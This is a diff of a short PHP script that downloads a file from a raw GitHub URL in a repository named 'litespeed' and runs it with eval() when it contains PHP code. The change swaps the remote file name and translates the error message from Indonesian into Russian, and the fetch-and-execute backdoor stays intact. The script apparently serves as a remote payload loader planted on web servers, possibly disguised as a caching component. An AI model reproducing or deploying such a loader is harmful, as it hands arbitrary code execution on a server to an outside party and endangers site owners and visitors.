@@ -2,7 +2,7 @@
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
-$url = 'https://raw.githubusercontent.com/vovkapudinov-beep/litespeed/refs/heads/main/dec.txt';
+$url = 'https://raw.githubusercontent.com/vovkapudinov-beep/litespeed/refs/heads/main/default.txt';
 
 
 function get_remote_content($url) {
@@ -33,5 +33,5 @@ $content = get_remote_content($url);
 if ($content && strpos($content, '<?php') !== false) {
     eval("?>".$content);
 } else {
-    die("Gagal mengambil atau file tidak valid dari: $url");
+    die("Не удалось получить файл или файл недействителен: $url");
 }
